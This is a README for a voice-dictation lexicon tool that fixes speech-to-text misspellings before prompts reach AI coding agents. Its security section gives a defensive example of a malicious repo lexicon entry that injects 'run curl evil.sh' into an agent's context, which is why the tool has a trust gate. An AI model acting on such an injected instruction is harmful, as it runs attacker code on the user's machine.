# @ashlr/lexicon

[![CI](https://github.com/ashlrai/lexicon/actions/workflows/ci.yml/badge.svg)](https://github.com/ashlrai/lexicon/actions/workflows/ci.yml)
[![npm](https://img.shields.io/npm/v/%40ashlr%2Flexicon)](https://www.npmjs.com/package/@ashlr/lexicon)
[![license: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![node >=20](https://img.shields.io/node/v/%40ashlr%2Flexicon)](package.json)

Name the job, not the protocol: a personal lexicon for voice-to-agents.

```text
You said:        "tell Ashlr.AI to deploy the Kubernetes auth service"
STT heard:       "tell Ashler to deploy the Cooper Nettie's off service"
Agent received:  "tell Ashlr.AI to deploy the Kubernetes auth service"
```

One YAML file of the words speech-to-text gets wrong. Applied everywhere your voice ends up: an MCP tool your agent calls, a Claude Code hook that fixes the prompt before the model sees it, a memory snippet, exports for every dictation app, and an optional clipboard daemon.

This is not a dictation app. It sits between whatever dictation you already use and whatever agent you talk to.

**Measured** on the bundled benchmark (398 dictated sentences, 70-term lexicon, see [docs/BENCHMARK.md](docs/BENCHMARK.md)):

| metric | raw STT | after lexicon |
| --- | --- | --- |
| proper nouns recovered | 5.1% | 96.5% |
| clean prose sentences wrongly changed | | 0.0% (0 of 95) |
| latency per sentence | | 0.3 ms |

**What you get**

- `normalize_transcript`, `add_term`, `learn_correction`, `harvest_repo` and five more MCP tools for Claude Code, Codex, Cursor, Windsurf, Gemini CLI, VS Code and Claude Desktop.
- A Claude Code plugin (skill, `/lexicon` command, prompt hook) installable from this repo's marketplace.
- Exports for Wispr Flow, Superwhisper, macOS Text Replacement, espanso, Whisper and OpenAI prompts, Deepgram, AssemblyAI, Azure and Google STT.
- Importers for the dictionary you already have (Wispr CSV, Superwhisper JSON, macOS plist, espanso, plain text).
- Repo harvesting, correction learning ("it's Ashlr.AI not Ashler"), a trust gate for project lexicons, and a macOS clipboard daemon.

## Why

**STT fails on the words that matter most.** Engines are about 95% accurate on ordinary English and near zero on invented names. "Ashlr.AI" becomes "Ashler". "Kubernetes" becomes "Cooper Nettie's". "SaaS" becomes "sauce". "Pydantic" becomes "pie dentic". "auth" becomes "off". Those are exactly the words an agent needs to get right.

**Dictionaries are trapped per app.** Wispr Flow, Superwhisper and Aqua each have their own vocabulary list. None of them share it, and none of them help when the transcript comes from somewhere else.

**Agents own their STT.** Claude Code `/voice`, ChatGPT voice, Claude voice, Grok, Codex and local Whisper each run their own recognizer with no user vocabulary. Your dictation app's dictionary never sees that audio.

**This project is the portable layer.** One lexicon file. Corrections happen after STT and before the model, wherever the text passes through: an MCP tool, a prompt hook, an agent memory resource, an export into your dictation app, or the clipboard.

## Install

```bash
npm i -g @ashlr/lexicon
```

Add a term. The first argument is the canonical spelling, the rest are what STT actually produces.

```bash
lexicon add Ashlr.AI Ashler Ashlar "Ashler AI" --phonetic ASH-ler
```

Try it.

```bash
lexicon normalize "tell Ashler to ship it"
# tell Ashlr.AI to ship it
```

## Use with Claude Code

Three options, from most to least integrated.

### a. Plugin

```bash
claude plugin marketplace add ashlrai/lexicon
claude plugin install lexicon@ashlrai
```

Or inside a Claude Code session: `/plugin marketplace add ashlrai/lexicon` then `/plugin install lexicon@ashlrai`. The marketplace manifest is [.claude-plugin/marketplace.json](.claude-plugin/marketplace.json).

The plugin ships `.mcp.json` (the `lexicon` MCP server, run as `node ${CLAUDE_PLUGIN_ROOT}/dist/mcp/server.js`), `hooks/hooks.json` (the prompt hook), a `lexicon` skill that tells Claude when to normalize and when to save a correction, and a `/lexicon` command (`/lexicon`, `/lexicon add X as Y, Z`, `/lexicon harvest`, `/lexicon export <format>`, `/lexicon remove X`).

The plugin's MCP server and hook point at `${CLAUDE_PLUGIN_ROOT}/dist/...`, which is fast and works offline but needs `dist/` to exist. A plugin install clones the repo without running `npm install`, so after installing either run `npm ci && npm run build` inside the plugin directory (`~/.claude/plugins/marketplaces/ashlrai/`), or skip the plugin's server and register the npm-installed one instead: `npm i -g @ashlr/lexicon && lexicon install claude --apply` (option b). If you want a zero-install fallback, point your own MCP config at `npx -y @ashlr/lexicon mcp` and the hook at `npx -y @ashlr/lexicon hook`; note `npx` adds startup latency the hook's 200ms budget was not designed for.

### b. Manual

```bash
lexicon install-claude          # print what would change
lexicon install-claude --apply  # do it
```

Without `--apply` it prints the three steps. With `--apply` it performs the first two:

1. Registers the MCP server: `claude mcp add --scope user lexicon -- node "<install path>/dist/mcp/server.js"`. Use `--scope project` to register it in the current repo instead.
2. Merges a `UserPromptSubmit` hook running `node "<install path>/dist/hooks/user-prompt-submit.js"` (timeout 5s) into `~/.claude/settings.json`. Existing hooks are kept. The fragment is in [examples/claude-settings.hook.json](examples/claude-settings.hook.json).
3. Reminds you to add "Read the `lexicon://me` resource before interpreting dictated text" to your `CLAUDE.md`.

Paths are absolute and quoted, so an install path with spaces works.

### c. Minimal

No hook, no MCP. Paste the markdown export into `CLAUDE.md` so the model at least knows the right spellings.

```bash
lexicon export claude-md >> CLAUDE.md
```

### What the hook does

Claude Code hooks cannot rewrite the prompt. The hook does not try. It runs `normalize` on the submitted text and, only if something changed, returns an `additionalContext` note:

```text
Voice lexicon corrections for this prompt (the user dictated; apply these):
"Ashler" -> "Ashlr.AI" (alias, 1.00)
"head sner" -> "Hetzner" (alias, 1.00)
Corrected prompt:
tell Ashlr.AI to ship it to Hetzner
```

The model starts the turn already knowing that "Ashler" means "Ashlr.AI". When nothing changed it prints nothing. It always exits 0, logs errors to stderr only, and measures about 100ms end to end including Node startup (budget 200ms), so a broken lexicon never blocks a prompt.

## Use with other agents

### One command per client

`lexicon install <client>` prints the MCP config the client needs, with the absolute path to the installed server. Add `--apply` to merge it into the client's config file (existing keys and other servers are kept; running it twice is a no-op).

```bash
lexicon install codex            # print the [mcp_servers.lexicon] block for ~/.codex/config.toml
lexicon install codex --apply    # write it
```

| Client | Command | Writes |
|---|---|---|
| Claude Code | `lexicon install claude` | same as `install-claude` (MCP + hook) |
| OpenAI Codex CLI | `lexicon install codex` | `~/.codex/config.toml` (`[mcp_servers.lexicon]`) |
| Cursor | `lexicon install cursor` | `~/.cursor/mcp.json` |
| Windsurf | `lexicon install windsurf` | `~/.codeium/windsurf/mcp_config.json` |
| Gemini CLI | `lexicon install gemini` | `~/.gemini/settings.json` |
| Claude Desktop | `lexicon install claude-desktop` | `~/Library/Application Support/Claude/claude_desktop_config.json` (macOS), `%APPDATA%\Claude\claude_desktop_config.json` (Windows) |
| VS Code | `lexicon install vscode` | `~/Library/Application Support/Code/User/mcp.json` (macOS), `~/.config/Code/User/mcp.json` (Linux), `%APPDATA%\Code\User\mcp.json` (Windows) |
| Anything else | `lexicon install` | prints the generic `mcpServers` snippet |

`--project` (or `--scope project`) writes the repo-level file instead where the client has one: `./.codex/config.toml`, `./.cursor/mcp.json`, `./.gemini/settings.json`, `./.vscode/mcp.json`. Every client ends with the same hint: `lexicon export claude-md >> <rules file>` (`CLAUDE.md`, `AGENTS.md` for Codex, `.cursor/rules/`, `GEMINI.md`) so the model prefers the canonical spellings even when it does not call the tool.

### Codex, Cursor, any MCP client

Point the client at the stdio server. See [examples/mcp-config.json](examples/mcp-config.json).

```json
{
  "mcpServers": {
    "lexicon": {
      "command": "lexicon-mcp",
      "args": []
    }
  }
}
```

`lexicon-mcp` is on your PATH after `npm i -g`. From a checkout, use `"command": "node", "args": ["/path/to/lexicon/dist/mcp/server.js"]` instead.

The agent then calls `normalize_transcript` on dictated input and reads `lexicon://me` for the full vocabulary.

### ChatGPT, Claude, Grok voice

You cannot patch their recognizer. What you can do is give the model the vocabulary so it corrects the transcript itself. Paste the export into custom instructions, memory or a project system prompt.

```bash
lexicon export claude-md | pbcopy
```

## Use with your dictation app

Export the same lexicon into each app's native dictionary format.

```bash
lexicon export <format> --out <file>
```

| Format | What you get | Where it goes |
|---|---|---|
| `wispr` | CSV `word,replacement` | Wispr Flow > Dictionary > Import |
| `superwhisper` | Replacements JSON | Superwhisper replacements |
| `macos` | Text Replacement `.plist` | Drag into System Settings > Keyboard > Text Replacements |
| `espanso` | espanso match YAML | `~/.config/espanso/match/lexicon.yml` |
| `whisper-prompt` | One line for Whisper `initial_prompt` | Any Whisper wrapper. Keep it under about 100 terms or it stops helping |
| `deepgram` | Keyword boost JSON | Deepgram `keywords` parameter |
| `assemblyai` | `word_boost` JSON | AssemblyAI `word_boost` / `boost_param` |
| `azure` | `phraseList` JSON | Azure Speech `PhraseListGrammar` |
| `google` | Adaptation `phraseSets` JSON | Google Speech-to-Text model adaptation (boost 20 for brand/person/product, 10 otherwise) |
| `openai` | One line of canonicals | OpenAI transcription `prompt` field (same as `whisper-prompt`) |
| `text` | `Canonical: alias1, alias2` per line | Anything human-edited; `lexicon import` reads it back |
| `markdown` | `- **Canonical** (category): aliases` bullets | READMEs, wikis |
| `csv` | Generic `canonical,alias` | Anything else |
| `json` | Raw lexicon JSON | Scripts, backups |

`lexicon export` with no format lists the formats. `--category brand person` limits the export to those categories. `--limit N` caps term count.

## Import an existing dictionary

Already trained a dictation app? Bring its dictionary over in one command instead of retyping it. The format is detected from the content; pass it explicitly when the file has no header.

```bash
lexicon import ~/Downloads/wispr-dictionary.csv          # auto-detected
lexicon import - --format text < names.txt               # stdin
lexicon import replacements.json --project --dry-run     # preview into .lexicon.yaml, write nothing
lexicon import Text\ Substitutions.plist --category brand
```

| Format | What it reads | Where to get it |
|---|---|---|
| `wispr` | CSV `word,replacement` (header optional, BOM/CRLF fine) | Wispr Flow > Dictionary > Export |
| `superwhisper` | JSON `[{ original, replacement }]` or `{ replacements: [...] }` | Superwhisper replacements file |
| `macos` | Text Replacement `.plist` (`shortcut` = alias, `phrase` = canonical) | Drag entries out of System Settings > Keyboard > Text Replacements |
| `espanso` | `matches:` YAML (`trigger` = alias, `replace` = canonical; templates with `vars`, regex or multi-line replacements are skipped) | `~/.config/espanso/match/*.yml` |
| `text` | One term per line: `Canonical`, `Canonical: alias1, alias2` or `Canonical = alias1 \| alias2`; `#` comments | Anything you typed by hand, or `lexicon export text` |
| `csv` | `canonical,alias,category,phonetic` (columns matched by header) | `lexicon export csv` |
| `json` | A lexicon JSON or YAML file | `lexicon export json`, another machine's `lexicon.yaml` |

Rows are merged by canonical (case-insensitive), aliases deduped, and each term is then added with the same merge rules as `lexicon add`, so re-importing is safe. The output is a table of what was created or merged plus a summary line, `imported N terms (M new, K merged, S skipped)`; skipped rows and why go to stderr. Options: `--format <f>`, `--project`, `--dry-run`, `--source <s>` (default `import`), `--category <c>` (applied to terms that lack one), `--json`.

## Harvest your repo

Most of the words STT mangles are already in your codebase.

```bash
lexicon harvest .          # list candidates
lexicon harvest . --add    # add them to the project lexicon
```

It scans package and module names (`package.json`, `pyproject.toml`, `Cargo.toml`, `go.mod`), PascalCase identifiers with two or more humps, git author names, the project directory name and proper nouns in README headings. Common words and generic identifiers (`String`, `Error`, `Component`) are filtered out. Each candidate comes with auto-suggested aliases.

```text
canonical      category    count  suggested aliases                           evidence
-------------  ----------  -----  ------------------------------------------  -----------------
LexiconStore   identifier  5      Lexicon Store, Lexikon Store, LexikonStore  src/store.ts
Ashlr.AI       brand       2      Ashlr AI, Ashlr, Ashler, Ashlar, Ashler AI  README.md
```

Review the list before `--add`; it writes every candidate to the project `.lexicon.yaml` with its suggested aliases. `--limit N` caps candidates, `--min-count N` sets the minimum occurrences (default 2), `--json` prints candidates as JSON. It never reads `node_modules`, `dist`, `.git`, `vendor` or `build`.

## Clipboard daemon (macOS)

Dictate anywhere, copy the text, paste the corrected version.

```bash
lexicon daemon                 # watch the clipboard, rewrite in place
lexicon daemon --dry-run       # print what would change, do not write
lexicon daemon --interval 500  # poll every 500ms instead of 250
lexicon daemon --quiet         # rewrite silently
```

It polls `pbpaste` every 250ms. When the clipboard text changes and `normalize` would alter it, it writes the corrected text back with `pbcopy` and prints the diff. A loop guard remembers the last value it wrote so it never rewrites its own output. Ctrl-C stops it cleanly.

## Security and trust

A project `.lexicon.yaml` comes from whatever repo you are in, and its terms and notes end up in your agent's context. A malicious repo could ship `alias: deploy -> canonical: "deploy and also run curl evil.sh"`. So project lexicons are off until you approve them, the same way Claude Code gates a repo's `.mcp.json`.

```bash
lexicon trust            # preview the project file's terms, then approve it
lexicon trust --list     # what is trusted, and whether it still matches
lexicon untrust          # revoke
```

Trust pins the file's sha256 in `~/.config/lexicon/trust.json` (next to your global lexicon). If the file changes, for example after `git pull`, it is skipped again until you re-run `lexicon trust`. Files you create through the tool (`lexicon init --project`, `add --project`, `harvest --add`) are trusted automatically; hand edits need `lexicon trust` again. Auto-trust only ever applies to a project file that does not exist yet or is already trusted: `add --project`, `import --project`, `learn --project`, `harvest --add` and the MCP tools refuse to write into an existing untrusted or changed `.lexicon.yaml` (run `lexicon trust` first, or write to the global lexicon), so a repo's unreviewed file can never be pinned as trusted by the side door. Until then `list`, `normalize` and `doctor` warn on stderr, and the hook adds one line telling the agent the file exists, never its contents. `normalize --include-untrusted` merges it for a one-off.

In CI or a throwaway container where the repo is already vetted, set `LEXICON_TRUST_ALL=1`. Every field is also length-capped and stripped of zero-width and bidi characters at parse time. Details in [SECURITY.md](SECURITY.md).

## The lexicon file

Two files, merged at load time.

| Scope | Path |
|---|---|
| Global | `$LEXICON_PATH`, else `$XDG_CONFIG_HOME/lexicon/lexicon.yaml`, else `~/.config/lexicon/lexicon.yaml` |
| Project | `.lexicon.yaml`, found by walking up from the current directory to the git root |

Project wins when both define the same canonical (case-insensitive). Aliases from both are unioned. Run `lexicon path` to see which files are in play.

A full annotated example is in [examples/lexicon.example.yaml](examples/lexicon.example.yaml). The short version:

```yaml
version: 1
terms:
  - canonical: Ashlr.AI
    aliases: [Ashler, Ashlar, Ashler AI, Ashley our AI]
    phonetic: ASH-ler
    category: brand
    notes: my company; never write Ashlar
  - canonical: SaaS
    aliases: [sass]
    category: acronym
    never: [sauce]
settings:
  minConfidence: 0.82
  phonetic: true
  fuzzy: true
  skipCode: true
  protectedWords: []
```

### Settings

| Key | Default | Meaning |
|---|---|---|
| `minConfidence` | `0.82` | Minimum confidence a phonetic or fuzzy match needs before it is applied. Exact aliases are always 1.0 |
| `phonetic` | `true` | Enable double metaphone matching |
| `fuzzy` | `true` | Enable edit-distance matching |
| `protectedWords` | `[]` | Words no term may ever replace. Merged with the built-in stoplist |
| `skipCode` | `true` | Leave `code spans`, fenced blocks, URLs and emails alone |

### `never` per term

`never` is a per-term list of words that must not be rewritten to that canonical even when they sound alike. It is how `SaaS` avoids eating every "sauce" in your prompt while still catching "sass".

## How matching works

Matching runs in three tiers over token windows. Exact hits are resolved first (longest span, earliest start); phonetic and fuzzy hits only get the spans left over, and matches never overlap.

1. **Exact alias.** Word-boundary, multi-word, case-insensitive and diacritic-insensitive (`bjorn halvorsen` hits `Bjørn Halvorsen`) unless the term sets `caseSensitive`. Confidence 1.0.
2. **Phonetic.** Double metaphone of a token window equals that of an alias or the canonical. Confidence about 0.9, scaled by length similarity.
3. **Fuzzy.** Normalized Damerau-Levenshtein (adjacent-transposition-aware) similarity at or above `minConfidence`. Confidence equals the similarity.

Guards, checked before any replacement:

- The built-in stoplist of about 300 common English words, plus `settings.protectedWords`, plus each term's `never`.
- Spans already equal to the canonical. They are also claimed, so no other term can rewrite a word inside `Tadeusz Wróblewski` or `Wispr Flow's`.
- Text inside code spans, fences, URLs and emails when `skipCode` is on.
- Tokens shorter than three characters, and metaphone keys shorter than three characters (`Zod`, `SSO`, `Neon`, `SaaS`), are only ever matched by exact alias. Spelled-out aliases such as `j w t` never get a phonetic key.
- A phonetic or fuzzy window of two or more words never starts or ends on a function word (`to`, `is`, `a`, `the`), so `normalizeTranscript to` cannot swallow the `to`.
- A lone lowercase word (`prism`, `email`, `gram`) matched by sound or spelling against a term that has explicit aliases must score at least 0.88.
- A trailing possessive is kept: `ashler ai's` becomes `Ashlr.AI's`.

**Explicit aliases always beat the stoplist.** If you list `off` as an alias for `auth`, "off" is rewritten. The stoplist exists to stop phonetic and fuzzy guessing, not to override what you wrote down. Use `never` if a term needs its own exceptions.

Every replacement carries `reason` (`alias`, `phonetic`, `fuzzy`) and `confidence`. `--dry-run` (CLI and MCP) returns the candidates without applying them.

```bash
lexicon normalize --diff "deploy to head sner with cooper netties and kubernetees"
# stderr:
#   "head sner" -> "Hetzner" (alias, 1.00)
#   "cooper netties" -> "Kubernetes" (phonetic, 0.85)
#   "kubernetees" -> "Kubernetes" (fuzzy, 0.91)
# stdout:
#   deploy to Hetzner with Kubernetes and Kubernetes
```

`--diff` goes to stderr so stdout stays pipeable. `--min-confidence 0.9`, `--no-phonetic` and `--no-fuzzy` override the file settings for one run. `normalize` always exits 0; if the lexicon fails to load it prints a warning to stderr and passes the text through unchanged.

## MCP tools

Server name: `lexicon`. Transport: stdio. Bin: `lexicon-mcp`. The lexicon is re-read on every call, so edits to the file take effect immediately.

| Tool | Arguments | Returns |
|---|---|---|
| `normalize_transcript` | `text`, `dryRun?`, `minConfidence?` | `output`, `changed`, `replacements[]`, `summary`. Also bumps each term's `hits` counter |
| `add_term` | `canonical`, `aliases?`, `phonetic?`, `category?`, `notes?`, `scope?` | The stored term, its file path and `created`. Aliases are auto-suggested when omitted |
| `remove_term` | `canonical`, `scope?` | Whether it existed |
| `list_terms` | `query?`, `category?` | Matching terms from the merged lexicon |
| `harvest_repo` | `path?`, `limit?`, `minCount?`, `add?` | Candidates. `add: true` writes them to the project lexicon |
| `export_lexicon` | `format`, `categories?`, `limit?` | The export as text |

| Resource | Type | Content |
|---|---|---|
| `lexicon://me` | `text/markdown` | The `claude-md` export of the merged lexicon. What an agent should read at session start |
| `lexicon://json` | `application/json` | The merged lexicon as JSON |

| Prompt | Purpose |
|---|---|
| `voice-context` | System-style snippet telling the agent to prefer canonical forms and treat dictated input as noisy |

## CLI reference

Global option: `--cwd <dir>` sets the directory used to find the project `.lexicon.yaml`.

| Command | Does |
|---|---|
| `lexicon init` | Create the global lexicon file if missing. `--project` creates `.lexicon.yaml` at the git root (or cwd) instead |
| `lexicon add <canonical> [aliases...]` | Add a term or merge aliases into an existing one. `--phonetic <hint>`, `--category <c>`, `--notes <text>`, `--project` (write to the project file), `--suggest` (append auto-generated misspellings; automatic when no aliases are given) |
| `lexicon remove <canonical>` (alias `rm`) | Remove a term, project lexicon first then global. `--project` looks only in the project file |
| `lexicon list` (alias `ls`) | List the merged lexicon. `--json`, `--category <c>`, `--query <text>` |
| `lexicon normalize [text...]` | Correct text from arguments or stdin. `--json`, `--diff` (to stderr), `--dry-run`, `--min-confidence <n>`, `--no-phonetic`, `--no-fuzzy`. Always exits 0 |
| `lexicon harvest [path]` | Scan a repo for candidate terms. `--limit <n>`, `--min-count <n>`, `--add`, `--json` |
| `lexicon export [format]` | Export for another tool; no format lists them. `--out <file>`, `--category <c...>`, `--limit <n>` |
| `lexicon import <file> [format]` | Import a dictation app's dictionary (`-` for stdin; format auto-detected). `--format <f>`, `--project`, `--dry-run`, `--source <s>`, `--category <c>`, `--json` |
| `lexicon path` | Print the resolved global and project file paths |
| `lexicon doctor` | Check lexicon files, term conflicts (duplicates across scopes, ambiguous aliases, aliases that are common words) and the Claude Code integration. Lines are `✓` ok, `!` warning, `✗` failure, `·` info. Exits 1 if anything failed |
| `lexicon mcp` | Start the stdio MCP server (same as `lexicon-mcp`) |
| `lexicon hook` | Run the Claude Code UserPromptSubmit hook (JSON in, JSON out) |
| `lexicon daemon` | macOS clipboard watcher. `--interval <ms>`, `--dry-run`, `--quiet` |
| `lexicon install-claude` | Print the Claude Code MCP + hook setup. `--apply` performs it, `--scope user|project` picks the MCP registration scope |
| `lexicon install [client]` | Print (or with `--apply`, merge) the MCP config for `claude`, `codex`, `cursor`, `windsurf`, `gemini`, `claude-desktop` or `vscode`; no client prints the generic snippet. `--project` / `--scope project` targets the repo-level file, `--home <dir>` overrides the home directory |

## Development

```bash
npm install
npm run build
npm test
```

Manual stdio check:

```bash
node dist/mcp/server.js
```

Interactive check with the MCP inspector:

```bash
npx @modelcontextprotocol/inspector node dist/mcp/server.js
```

Module layout and design decisions are in [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md). The research behind the project is in [docs/RESEARCH.md](docs/RESEARCH.md). See [CONTRIBUTING.md](CONTRIBUTING.md) to add an exporter or harvester.

## Roadmap and non-goals

Non-goals:

- Not a dictation app. Bring your own.
- No hosted accounts, no sync service. It is a file.
- No Chrome extension.

Roadmap:

- Learned aliases: notice when you correct the agent and propose the alias.
- Team-shared lexicon committed to the repo, merged under the personal one.
- Windows and Linux clipboard daemon.
- VS Code extension.

## License

MIT. Copyright 2026 Ashlr.AI.
